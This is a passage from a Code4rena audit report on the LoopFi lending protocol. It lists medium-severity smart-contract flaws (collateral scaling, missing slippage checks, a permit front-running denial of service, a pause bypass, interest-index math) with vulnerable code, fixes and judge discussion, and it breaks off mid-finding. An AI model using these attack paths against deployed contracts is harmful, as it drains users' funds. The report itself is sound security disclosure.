- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L367-L460
For example, when withdrawing collateral, it will scale it with tokenScale from internal amount:

uint256 amount = wmul ( abs ( deltaCollateral ), tokenScale ); token.

safeTransfer ( collateralizer, amount ); However, when sending collateral to the liquidator, it uses the internal amount without scaling by tokenScale in function liquidatePosition at L565.

token.

safeTransfer ( msg.

sender, takeCollateral ); As a result, when tokenScale < 10 ** 18, the above line actually send more tokens to the liquidator than it is supposed to, a loss of funds for the protocol.

## Recommended Mitigation Steps

Scale the collateral amount from internal representation to the real amount by tokenScale.

## Assessed type

Decimal 0xtj24 (LoopFi) acknowledged Koolex (judge) decreased severity to Medium Note: For full discussion, see here.

# [M-12] Unclaimed rewards handling issue in AuraVault contract functions ( AuraVault::deposit , AuraVault::mint , AuraVault::withdraw and AuraVault::redeem

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-12
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

AuraVault contract functions ( AuraVault::deposit, AuraVault::mint, AuraVault::withdraw and AuraVault::redeem ) Submitted by Agontuk, also found by 0xc0ffEE The AuraVault contract is designed to manage assets and distribute rewards from an Aura RewardsPool. The primary functions involved in asset management are deposit(), mint(), withdraw(), and redeem(). These functions rely on the totalAssets() function to calculate the total value of assets managed by the vault. However, the current implementation of totalAssets() does not account for unclaimed rewards, which can lead to incorrect calculations of shares and assets.

The totalAssets() function currently only returns the balance of the underlying asset in the reward pool:

File:

AuraVault.

sol 175:

function totalAssets () public view virtual override ( IERC4626, ERC4626 ) returns ( uint256 ) { 176:

return IPool ( rewardPool ).

balanceOf ( address ( this )); 177: } This function does not include unclaimed rewards, which can be obtained using IPool(rewardPool).earned(address(this)). As a result, the deposit(), mint(), withdraw(), and redeem() functions may calculate shares and assets incorrectly, potentially causing users to receive more or fewer shares/assets than they should.

## Impact

The primary impact of this issue is that users may receive an incorrect number of shares or assets due to the inaccurate calculation of totalAssets(). This can lead to financial discrepancies, where some users may gain an unfair advantage while others may suffer losses. The severity of this issue is medium to high, depending on the extent of the financial impact on users. An incorrect totalAssets() value affects the accuracy of the deposit(), mint(), withdraw(), and redeem() functions, leading to an unfair distribution of assets.

## Recommended Mitigation Steps

To fix this issue, include unclaimed rewards in the totalAssets() calculation:

function totalAssets() public view virtual override(IERC4626, ERC4626) returns (uint256) { - return IPool(rewardPool).balanceOf(address(this)); + uint256 unclaimedRewards = IPool(rewardPool).earned(address(this)); + return IPool(rewardPool).balanceOf(address(this)) + unclaimedRewards; } This ensures that the shares and assets are correctly calculated in the deposit(), mint(), withdraw(), and redeem() functions.

amarcu (LoopFi) acknowledged and commented:

Acknowledged, but we will remove and not use the AuraVault.

# [M-13] Lack of Slippage Control in AuraVault::deposit and AuraVault::mint Functions Can Lead to Unexpected Financial Losses for Users

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-13
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

AuraVault::deposit and AuraVault::mint Functions Can Lead to Unexpected Financial Losses for Users Submitted by Agontuk, also found by Bauchibred, minglei-wang-3570, and crypticdefense The AuraVault contract implements ERC-4626 vault functionality, allowing users to deposit assets and mint shares. However, the deposit and mint functions lack slippage controls, which can result in users receiving fewer shares or sending more assets than expected. This issue is similar to a previously reported bug in the bHermes contract, where the absence of slippage controls in the ERC4626DepositOnly.deposit and ERC4626DepositOnly.mint functions led to unexpected outcomes for users.

Detailed Description The AuraVault contract is designed to manage assets and distribute rewards from an Aura RewardsPool. It includes functions for depositing assets and minting shares, which are critical for users interacting with the vault. However, these functions do not allow users to specify slippage parameters, exposing them to potential financial losses.

deposit Function The deposit function allows users to deposit a specified amount of assets and receive shares in return. The function calculates the number of shares to be minted using the previewDeposit function and then proceeds with the deposit. However, it does not allow users to specify a minimum number of shares to be minted, which can lead to slippage issues.

File:

AuraVault.

sol 199:

function deposit ( uint256 assets, address receiver ) public virtual override ( IERC4626, ERC4626 ) returns ( uint256 ) { 200:

uint256 shares = previewDeposit ( assets ); 201:

_deposit ( _msgSender (), receiver, assets, shares ); 202:

203:

// Deposit in reward pool 204:

IERC20 ( asset ()).

safeApprove ( rewardPool, assets ); 205:

IPool ( rewardPool ).

deposit ( assets, address ( this )); 206:

207:

return shares; 208: } mint Function The mint function allows users to mint a specified number of shares by depositing the required amount of assets. The function calculates the required assets using the previewMint function and then proceeds with the minting. However, it does not allow users to specify a maximum number of assets to be sent, which can lead to slippage issues.

File:

AuraVault.

sol 216:

function mint ( uint256 shares, address receiver ) public virtual override ( IERC4626, ERC4626 ) returns ( uint256 ) { 217:

uint256 assets = previewMint ( shares ); 218:

_deposit ( _msgSender (), receiver, assets, shares ); 219:

220:

// Deposit assets in reward pool 221:

IERC20 ( asset ()).

safeApprove ( rewardPool, assets ); 222:

IPool ( rewardPool ).

deposit ( assets, address ( this )); 223:

224:

return assets; 225: } Root Cause The root cause of the issue is the absence of slippage control parameters in the deposit and mint functions. Users cannot specify minimum shares to be minted or maximum assets to be sent, leading to potential financial losses due to slippage.

## Impact

Users can lose funds due to unexpected slippage when interacting with the AuraVault contract. Specifically, they may receive fewer shares than expected when depositing assets or send more assets than expected when minting shares. This can result in significant financial losses, especially in volatile market conditions.

## Recommended Mitigation Steps

Add slippage control parameters to the deposit and mint functions to allow users to specify minimum shares to be minted and maximum assets to be sent. This will ensure that transactions revert if the slippage conditions are not met.

- function deposit(uint256 assets, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) { + function deposit(uint256 assets, uint256 minShares, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) { uint256 shares = previewDeposit(assets); + require(shares >= minShares, "AuraVault: Insufficient shares minted"); _deposit(_msgSender(), receiver, assets, shares); // Deposit in reward pool IERC20(asset()).safeApprove(rewardPool, assets); IPool(rewardPool).deposit(assets, address(this)); return shares; } - function mint(uint256 shares, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) { + function mint(uint256 shares, uint256 maxAssets, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) {

uint256 assets = previewMint(shares); + require(assets <= maxAssets, "AuraVault: Excessive assets required"); _deposit(_msgSender(), receiver, assets, shares); // Deposit assets in reward pool IERC20(asset()).safeApprove(rewardPool, assets); IPool(rewardPool).deposit(assets, address(this)); return assets; } These changes allow users to specify their slippage tolerance, protecting them from unexpected losses due to market volatility or delayed transaction execution.

amarcu (LoopFi) acknowledged and commented:

Acknowledged, but we will remove and not use the AuraVault.

Koolex (judge) commented:

EIP4626 encourage to add slippage protection by adding additional functions which doesn’t violate it.

If implementors intend to support EOA account access directly, they should consider adding an additional function call for deposit/mint/withdraw/redeem with the means to accommodate slippage loss or unexpected deposit/withdrawal limits, since they have no other means to revert the transaction if the exact output amount is not achieved.

Note: For full discussion, see here.

# [M-14] DOS attack to SwapAction.transferAndSwap() when using an ERC20 permit transferFrom

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-14
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

SwapAction.transferAndSwap() when using an ERC20 permit transferFrom Submitted by chaduke, also found by minglei-wang-3570, Infect3d, zhaojohnson ( 1, 2 ), 0xINFINITY ( 1, 2 ), Spearmint, 0xbepresent, pks_, petarP1998, Anirruth, and pkqs90 SwapAction.transferAndSwap() will perform a _transferFrom to transfer the input tokens to the user proxy and then perform a swap via a router. When it uses an ERC20 permit transferFrom, an attacker can extract the v, r, s from the safePermit() call and frontruns it with a direct safePermit() with the same arguments. As a result, SwapAction.transferAndSwap() will fail due to the advancing of nonce. Effectively, this is a DOS attack.

## Recommended Mitigation Steps

Change the logic to either there is sufficient allowance or the safePermit succeeds using a try-catch clause:

function _transferFrom( address token, address from, address to, uint256 amount, PermitParams memory params ) internal { if (params.approvalType == ApprovalType.PERMIT2) { // Consume a permit2 message and transfer tokens.

ISignatureTransfer(permit2).permitTransferFrom( ISignatureTransfer.PermitTransferFrom({ permitted: ISignatureTransfer.TokenPermissions({token: token, amount: params.approvalAmount}), nonce: params.nonce, deadline: params.deadline }), ISignatureTransfer.SignatureTransferDetails({to: to, requestedAmount: amount}), from, bytes.concat(params.r, params.s, bytes1(params.v)) // Construct signature ); } else if (params.approvalType == ApprovalType.PERMIT) { // Consume a standard ERC20 permit message try IERC20Permit(token).safePermit( from, to, params.approvalAmount, params.deadline, params.v, params.r, params.s ){} catch{ if(IERC20(token).allowance(from, to) < params.approvalAmount) revert("not enough allowance");

} IERC20(token).safeTransferFrom(from, to, amount); } else { // No signature provided, just transfer tokens.

IERC20(token).safeTransferFrom(from, to, amount); }

## Assessed type

DoS amarcu (LoopFi) acknowledged and commented:

The transfer action also supports regular transfers, so if a user is constantly getting frontrun we can skip the permit and use the regular allowance/transfer flow. There is no reason to add the fallback mechanism for the allowance check because if we had that in the first place we could skip permits altogether. Also making the allowance mandatory makes permit calls redundant.

# [M-15] WhenNotPaused modifier in the CDPVault can be bypassed by users

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-15
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

WhenNotPaused modifier in the CDPVault can be bypassed by users Submitted by Kaysoft, also found by Afriauditor ( 1, 2 ), chaduke, 0xAlix2, boraichodrunkenmaster, ElCid, Spearmint, josephxander, Centaur, zhaojohnson, Bigsam, peanuts, yashar, Inspecktor, ak1, hash, pkqs90, zxriptor, JanuaryPersimmon2024, and ustas

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L223-L233
- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L239-L249

## Impact

Users can still execute deposit and withdraw functions when the CDPVault.sol is paused as against the design expectation by just calling the modifyCollateralAndDebt(...) function with the necessary parameters.

## Recommended Mitigation Steps

Consider implementing either of the two solutions:

Make the modifyCollateralAndDebt(...) internal instead of public, or Add the whenNotPaused modifier to the modifyCollateralAndDebt(...) function.

amarcu (LoopFi) confirmed

# [M-16] Incorrect calculation of newCumulativeIndex in function calcDecrease

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-16
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

newCumulativeIndex in function calcDecrease Submitted by hearmen, also found by boraichodrunkenmaster, emerald7017, chaduke, 0xBugSlayer, thisvishalsingh, joaovwfreire, 0xpiken, Chinmay, hash, and pkqs90 In the contract CDPVault.sol, the function calcDecrease calculates newCumulativeIndex in line 703 when amountToRepay < interestAccrued with profit which is:

- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L703
newCumulativeIndex = ( INDEX_PRECISION * cumulativeIndexNow * cumulativeIndexLastUpdate ) / ( INDEX_PRECISION * cumulativeIndexNow - ( INDEX_PRECISION * profit * cumulativeIndexLastUpdate ) / debt ); // U:[CL-3] However, the profit contains the cumulativeQuotaInterest, so it can not be used to calculate newCumulativeIndex.

- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L668
if ( amountToRepay >= cumulativeQuotaInterest ) { amountToRepay -= cumulativeQuotaInterest; // U:[CL-3] profit += cumulativeQuotaInterest; // U:[CL-3] newCumulativeQuotaInterest = 0; // U:[CL-3] } For example, when the left amountToRepay can cover the interestAccrued, the newCumulativeIndex should be cumulativeIndexNow as in line 692, because:

interestAccrued == (debt * cumulativeIndexNow) / cumulativeIndexLastUpdate - debt.

- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L692
if ( amountToRepay >= interestAccrued ) { amountToRepay -= interestAccrued; profit += interestAccrued; newCumulativeIndex = cumulativeIndexNow; } However, when the left amountToRepay = interestAccrued - 1, and profit will be cumulativeQuotaInterest+interestAccrued - 1. The calculation of newCumulativeIndex will be larger than cumulativeIndexNow because the cumulativeQuotaInterest+interestAccrued - 1 will be larger than interestAccrued which is totally wrong, since it exceeds the limit cumulativeIndexNow.

- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L703
newCumulativeIndex = ( INDEX_PRECISION * cumulativeIndexNow * cumulativeIndexLastUpdate ) / ( INDEX_PRECISION * cumulativeIndexNow - ( INDEX_PRECISION * profit * cumulativeIndexLastUpdate ) / debt ); // U:[CL-3]

## Impact

Position.cumulativeIndexLastUpdate will be updated with incorrect newCumulativeIndex and less interest accrued will be charged from users. The position which should be liquidated will not be liquidated due the the wrong Position.cumulativeIndexLastUpdate.

## Recommended Mitigation Steps

Use the code as below:

else { // If amount is not enough to repay interest, then send all to the stakers and update index profit += amountToRepay; // U:[CL-3] newCumulativeIndex = ( INDEX_PRECISION * cumulativeIndexNow * cumulativeIndexLastUpdate ) / ( INDEX_PRECISION * cumulativeIndexNow - ( INDEX_PRECISION * amountToRepay * cumulativeIndexLastUpdate ) / debt ); // U:[CL-3] amountToRepay = 0; // U:[CL-3] }

## Assessed type

Other 0xtj24 (LoopFi) confirmed and commented:

Fixed.

# [M-17] PositionAction.decreaseLever() fails to consider the loan fee in Flashlender when calculating loanAmount , as a result, the functionality will not work when protocolFee != 0

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-17
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionAction.decreaseLever() fails to consider the loan fee in Flashlender when calculating loanAmount, as a result, the functionality will not work when protocolFee != 0 Submitted by chaduke, also found by 0xAlix2, 13u9, zhaojohnson, lian886, lanrebayode77, Nyx, 0xbepresent, 0xpiken, 0xc0ffEE, gumgumzum, hash, pkqs90, and nnez PositionAction.decreaseLever() allows one to decrease the leverage for a position by doing the following:

Perform a creditFlashLoan to loan loanAmount of underlying tokens; Perform a modifyCollateralAndDebt (inside PositionAction.onCreditFlashLoan() to reduce the debt of the position by loanAmount.

Withdraw collateral from the position in the amount of withdrawnCollateral.

Swap the withdrawn collateral to underlying tokens with the exact output amount of leverParams.primarySwap.amount = loanAmount + fee using input collateral in the amount of swapAmountIn.

The remainng collateral withdrawnCollateral - swapAmountIn is either sent to the residualRecipient or swap to the specified tokens and sent to the receiver.

Return the loan loanAmount + protocolFee back to the pool.

The first problem lies in PositionAction.increaseLever():

loanAmount uses leverParams.primarySwap.amount, it does not consider the protocol fee.

leverParams.primarySwap.amount is the amount of underlying tokens that needs to be swapped out that will be returned back to the pool, which includes the protocol fee. In other words, the correct formula is loanAmount = leverParams.primarySwap.amount - fee.

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/PositionAction.sol#L364
Meanwhile, function positionAction.onCreditFlashLoan() has a similar problem:

subDebt, the debt to be reduced from the position should be the same as loanAmount, which is leverParams.primarySwap.amount - fee. However, the function uses leverParams.primarySwap.amount as subDebt, which is wrong.

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/PositionAction.sol#L444C17-L444C25
In summary, both functions do not consider the impact of protcolFee, as a result, these functions will fail.

## Recommended Mitigation Steps

Correct the two functions as follows, focusing on calculating the correct loanAmount and subDebt and returnAmount:

function decreaseLever ( LeverParams calldata leverParams, uint256 subCollateral, address residualRecipient ) external onlyDelegatecall { // validate the primary swap if ( leverParams.

primarySwap.

swapType != SwapType.

EXACT_OUT || leverParams.

primarySwap.

recipient != self ) revert PositionAction__decreaseLever_invalidPrimarySwap (); // validate aux swap if it exists if ( leverParams.

auxSwap.

assetIn != address ( 0 ) && ( leverParams.

auxSwap.

swapType != SwapType.

EXACT_IN )) revert PositionAction__decreaseLever_invalidAuxSwap (); /// validate residual recipient is provided if no aux swap is provided if ( leverParams.

auxSwap.

assetIn == address ( 0 ) && residualRecipient == address ( 0 )) revert PositionAction__decreaseLever_invalidResidualRecipient (); // take out credit flash loan IPermission ( leverParams.

vault ).

modifyPermission ( leverParams.

position, self, true ); uint protocolFee = flashlender.

protocolFee (); // loanAmount (WAD + protocolFee)/WAD = leverParams.primarySwap.amount uint loanAmount = leverParams.

primarySwap.

amount * ( 10 ** 18 ) / ( 10 ** 18 + protocolFee ); // loanamount should be smaller flashlender.

creditFlashLoan ( ICreditFlashBorrower ( self ), loanAmount, abi.

encode ( leverParams, subCollateral, residualRecipient ) ); IPermission ( leverParams.

vault ).

modifyPermission ( leverParams.

position, self, false ); } function onCreditFlashLoan ( address /*initiator*/, uint256 /*amount*/, uint256 /*fee*/, bytes calldata data ) external returns ( bytes32 ) { if ( msg.

sender != address ( flashlender )) revert PositionAction__onCreditFlashLoan__invalidSender (); ( LeverParams memory leverParams, uint256 subCollateral, address residualRecipient ) = abi.

decode ( data,( LeverParams, uint256, address )); uint protocolFee = flashlender.

protocolFee (); // loanAmount (WAD + protocolFee)/WAD = leverParams.primarySwap.amount uint loanAmount = leverParams.

primarySwap.

amount * ( 10 ** 18 ) / ( 10 ** 18 + protocolFee ); // loanamount should be smaller underlyingToken.

forceApprove ( address ( leverParams.

vault ), loanAmount ); // // should be equal to loanAmount // sub collateral and debt ICDPVault ( leverParams.

vault ).

modifyCollateralAndDebt ( leverParams.

position, address ( this ), address ( this ), 0, - toInt256 ( loanAmount ) // should be equal to loanAmount ); // withdraw collateral and handle any CDP specific actions uint256 withdrawnCollateral = _onDecreaseLever ( leverParams, subCollateral ); bytes memory swapData = _delegateCall ( address ( swapAction ), abi.

encodeWithSelector ( swapAction.

swap.

selector, leverParams.

primarySwap ) ); uint256 swapAmountIn = abi.

decode ( swapData, ( uint256 )); // swap collateral to stablecoin and calculate the amount leftover uint256 residualAmount = withdrawnCollateral - swapAmountIn; // send left over collateral that was not needed to payback the flash loan to `residualRecipient` if ( residualAmount > 0 ) { // perform swap from collateral to arbitrary token if necessary if ( leverParams.

auxSwap.

assetIn != address ( 0 )) { _delegateCall ( address ( swapAction ), abi.

encodeWithSelector ( swapAction.

swap.

selector, leverParams.

auxSwap ) ); } else { // otherwise just send the collateral to `residualRecipient` IERC20 ( leverParams.

primarySwap.

assetIn ).

safeTransfer ( residualRecipient, residualAmount ); } underlyingToken.

forceApprove ( address ( flashlender ), leverParams.

primarySwap.

amount ); // returnAmoutn is the output amount of the swap return CALLBACK_SUCCESS_CREDIT; }

## Assessed type

Math amarcu (LoopFi) confirmed

# [M-18] In CDPVault::liquidatePositionBadDebt() , the calculation of loss is incorrect

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-18
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

CDPVault::liquidatePositionBadDebt(), the calculation of loss is incorrect Submitted by lian886, also found by lanrebayode77, crypticdefense, 0xpiken, and hash

- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L579
- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L735
- https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509

## Impact

The incorrect calculation affects the protocol’s profit assessment, resulting in potential losses for users, particularly in the interest portion.

## Recommended Mitigation Steps

Modify the relevant formula for calculating the loss.

## Assessed type

Math 0xtj24 (LoopFi) confirmed Koolex (judge) decreased severity to Medium and commented:

Looks valid. However, this is based on the assumption that loss of revenue is not a loss. Requesting from the Warden to provide further input to support this assumption. only in PJQA please.

crypticdefense (warden) commented:

@Koolex, I would like to provide further info as requested (my issue #394 is a duplicate).

The assumption that the accruedInterest is not a loss is based off how the protocol itself will burn treasury shares to make up for the loss when there is bad debt. Think about it like this, the accruedInterest is the profit the protocol will receive from lending, and if there is bad debt accumulated, that means the accruedInterest has not been paid.

Then, when someone liquidates the bad debt position, they can liquidate it for a discount. Since they are paying at a discount, the full debt cannot be repaid, so the protocol will proceed to cover the rest of the amount of debt by burning treasury shares. The loss calculation is as follows:

position debt + accruedInterest - repayAmount, where repayAmount is the amount paid by the liquidator. However, the protocol never lost accruedInterest amount, that is just potential profit from lending that was never received.

Even if there exists a case where some of the accruedInterest was paid by the borrower, that is still profit that the protocol is burning. It should only burn the amount of shares equivalent to the debt owed, because that represents the loss. Profit accumulated is not a loss.

So the protocol will proceed to burn loss amount of treasury shares. It is burning extra treasury shares here because it includes accruedInterest, causing a range of issues such as DoS due to insufficient shares and incorrect accounting.

Koolex (judge) commented:

Thank you for the additional clarification. The issue stays as-is.

# [M-19] Because of the asset: Share 1:1 Conversion , if vault incurs a loss, the last user to withdraw will take the entire loss

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-19
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

Share 1:1 Conversion, if vault incurs a loss, the last user to withdraw will take the entire loss Submitted by Infect3d, also found by zhaojohnson, Spearmint, lian886, pkqs90, and nnez Because of the 1:1 conversion rate in PoolV3, if the pool incur a loss due to liquidation from borrowed asset through CDPVault, last user to withdraw will take the full loss.

## Vulnerability details

Every user should be allowed to withdraw a fair share of what’s is available in the vault. But as:

The exchange rate is always 1:1 for deposit and withdraw and losses can happen as the underlying can be borrowed, There will be situations where the last user to withdraw will not be made whole.

Also, if the last user A is not whole, and another user B deposit to the vault, A can get its missing assets from B deposit and B will be at loss waiting for another deposit.

Scenario:

Alice and Bob deposit 10 ETH each to PoolV3, PoolV3 has 20 ETH.

Each user receive 10 shares, and there are 20 total shares.

Eve deposit collateral to CDPVault and borrow 5 ETH.

Eve get liquidated, the loss is 1 ETH.

Treasury has 0 remaining assets to cover the debt (works also if less than 1 ETH treasury).

PoolV3 has now 19 ETH, and Alice and Bob 10 shares each where the exchange rate is 1:1.

Alice withdraw 10 ETH with her 10 shares.

There’s only 9 ETH left for Bob.

File:

src / PoolV3.

sol 529:

function repayCreditAccount ( 530:

uint256 repaidAmount, 531:

uint256 profit, 532:

uint256 loss 533: )...:

// ------- some code ------- //...:

548:

if ( profit > 0) { 549:

_mint ( treasury, convertToShares ( profit )); 550: } else if ( loss > 0 ) { <@( 1 ) //we're in this case when there's a loss 551:

address treasury_ = treasury; 552:

uint256 sharesInTreasury = balanceOf ( treasury_ ); 553:

uint256 sharesToBurn = convertToShares ( loss ); 554:❌ if ( sharesToBurn > sharesInTreasury ) { <@( 2 ) //sharesToBurn are capped to sharesInTreasury 555:

unchecked { 556:

emit IncurUncoveredLoss ({ 557:

creditManager:

msg.

sender, 558:

loss:

convertToAssets ( sharesToBurn - sharesInTreasury ) 559: }); 560: } 561:❌ sharesToBurn = sharesInTreasury; <@( 2 ) 562: } 563:❌ _burn ( treasury_, sharesToBurn ); 564: }

## Impact

Loss of funds for users. Unfair loss distribution among users, as the only last withdrawer will incur the entire loss of the vault

## Recommended Mitigation Steps

When there are more shares than assets and vault cannot make all users whole. Withdrawals should be lossy to split loss over all users.

This could be something like this:

/// @dev Internal conversion function (from assets to shares) with support for rounding direction /// @dev Pool is not vulnerable to the inflation attack, so the simplified implementation w/o virtual shares is used function _convertToShares ( uint256 assets, Math.Rounding rounding ) internal returns ( uint256 shares ) { uint256 supply = totalSupply (); if ( supply < totalAssets ()) { shares = ( assets == 0 || supply == 0 ) ?

assets:

assets.

mulDiv ( supply, totalAssets (), rounding ); } else { shares = assets; } return shares; } /// @dev Internal conversion function (from shares to assets) with support for rounding direction /// @dev Pool is not vulnerable to the inflation attack, so the simplified implementation w/o virtual shares is used function _convertToAssets ( uint256 shares, Math.Rounding rounding ) internal returns ( uint256 assets ) { uint256 supply = totalSupply (); if ( supply < totalAssets ()) { assets = ( supply == 0 ) ?

shares:

shares.

mulDiv ( totalAssets (), supply, rounding ); } else { assets = shares; } return assets; }

## Assessed type

Math 0xtj24 (LoopFi) acknowledged Koolex (judge) decreased severity to Medium

# [M-20] Honest users could be permanently DOS’d from withdrawing their vested tokens/rewards

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-20
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

Submitted by Bauchibred

## Impact

Potential permanent DOS to honest users (or force the users to incur losses since some tech savvy users can notice this griefing attempt, but to stop this they’d have to withdraw early which forces them to incur losses, since even if the vesting duration reduces there is no other method for the user to withdraw their tokens and it’s stuck in the protocol. Alternatively, if the user leaves the claiming of their tokens even after the vesting period and does not immediately withdraw; the chances of this happening heavily increases since with each day an entry to the _userEarnings array can be made.

## Recommended Mitigation Steps

Consider introducing some access control to ChefIncentivesController#Claim() and only allow the users call this for themselves.

## Assessed type

DoS amarcu (LoopFi) confirmed and commented:

This is a grieve attack on rewards, the user funds are not at risk.

Koolex (judge) decreased severity to Medium 0xAlix2 (warden) commented:

@Koolex - I respectfully believe that this is invalid, as vesting tokens is only doable by minters, here, that are assigned by the contract owner, i.e., trusted. Moreover, a user is allowed to call claim on a certain number of reward tokens, so even if DOS exists (it doesn’t but assuming minters are malicious) a user can still claim their rewards.

Bauchibred (warden) commented:

I do not understand the sponsors claim above to downgrade the severity of this report. Afaik, in the scope of this audit rewards are to be considered as users funds. This attack case has a simple path, a malicious user griefs users from their rewards by constantly calling ChefIncentivesController#Claim() so they are forced to incur losses.

This directly puts their assets at risk as they can’t access it as expected and why I submitted as High. Since the viable option for the users, which in my opinion, still points this to high is for them to withdraw early and incur losses.

Also I think @0xAlix2 seems to see the bug case as been backed by a malicious minter; however, their claim actually shows how vesting the tokens every day would be what a non-malicious minter would do; since if users are active and earn rewards for that day then there should be no reason why their tokens are not vested for the day which is what he’s suggesting. If that’s done, then this just breaks the logic as users are not being given their rewards, no?

Koolex (judge) commented:

Thank you everyone for your input. Given the input above, I believe this is valid and stays as-is.

# [M-21] In PositionActionPendle::_onDecreaseLever , tokenOut is implemented incorrectly

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-21
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

PositionActionPendle::_onDecreaseLever, tokenOut is implemented incorrectly Submitted by minglei-wang-3570, also found by zhaojohnson, lian886, and 0xc0ffEE The function PositionActionPendle::_onDecreaseLever is a hook to decrease lever by withdrawing collateral from the CDPVault. But the current implementation is wrong if leverParams.auxAction.args.length is 0, _onWithdraw is called here, but the tokenOut still returns 0.

function _onDecreaseLever ( LeverParams memory leverParams, uint256 subCollateral ) internal override returns ( uint256 tokenOut ) { @> _onWithdraw ( leverParams.

vault, leverParams.

position, address ( 0 ), subCollateral ); if ( leverParams.

auxAction.

args.

length != 0 ) { bytes memory exitData = _delegateCall ( address ( poolAction ), abi.

encodeWithSelector ( poolAction.

exit.

selector, leverParams.

auxAction ) ); @> tokenOut = abi.

decode ( exitData, ( uint256 )); } The tokenOut accounting will be incorrect if the leverParams.auxAction.args.length is 0.

## Recommended Mitigation Steps

Handle the edge case properly like PositionAction4626::_onDecreaseLever() and return tokenOut if leverParams.auxAction.args.length is 0.

## Assessed type

Token-Transfer amarcu (LoopFi) confirmed and commented:

The flow will always revert because of how the parameters are set. We will make the update to always revert with a custom message for the case where the auxSwap is not defined. Maybe this can be re-evaluated as a medium.

Koolex (judge) decreased severity to Medium and commented:

Medium, since it is an edge case.

# [M-22] Users of a vault can steal other user’s rewards when one vault’s lastRewardTime differs from another vault’s lastRewardTime

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** M-22
- **Severity:** Medium
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

lastRewardTime differs from another vault’s lastRewardTime Submitted by rscodes, also found by 0xpiken, hash, and novamanbg ( 1, 2 ) In ChefIncentivesController.sol, the _newRewards function calculates the new rewards accumulated since the last update of that specific pool Line 988-994:

function _newRewards ( VaultInfo memory pool, uint256 _totalAllocPoint ) internal view returns ( uint256 newReward, uint256 newAccRewardPerShare ) {.....

if ( lpSupply > 0 ) { -> uint256 duration = block.

timestamp - pool.

lastRewardTime; -> uint256 rawReward = duration * rewardsPerSecond; -> uint256 rewards = availableRewards (); -> if ( rewards < rawReward ) { -> rawReward = rewards; -> }.....

} For example, when a user changes his debt in CDPVault, handleActionAfter is called by the vault, which only changes the pool.lastRewardTime of that individual pool representing that vault through _updatePool.

This is problematic as it means different pools can have different pool.lastRewardTime, which means the way that rewards are calculated in _newRewards will cause one pool to receive more rewards than it is supposed to, at the loss of another pool.

A summary would be that availableRewards() returns depositedRewards - accountedRewards; and pool.lastRewardTime being different means that one pool has been adding to accountedRewards and its struct variables ahead of another pool. That one pool should then have a “lesser” share in the value returned by availableRewards(); however, the current code does not take that into account, allowing that pool to dig into rewards meant for other pools who has a more outdated pool.lastRewardTime.

Consider this symbol diagram example:

